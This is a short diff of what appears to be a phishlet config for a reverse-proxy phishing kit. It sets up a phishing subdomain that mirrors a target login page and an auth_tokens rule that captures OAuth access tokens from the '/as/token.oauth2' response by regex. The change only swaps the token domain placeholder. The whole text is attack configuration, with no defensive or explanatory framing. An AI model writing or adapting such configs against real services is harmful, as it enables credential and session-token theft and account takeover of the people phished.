@@ -6,7 +6,7 @@ proxy_hosts:
 - {phish_sub: '<target_sub>', orig_sub: '<target_sub>', domain: '<target_domain>', session: true, is_landing: true, auto_filter: true}
 sub_filters:
 auth_tokens:
-- domain: '<target_domain>'
+- domain: '<auth_target_domain>'
   path: '/as/token.oauth2'
   name: 'token'
   search: '"access_token":"([^"]*)'
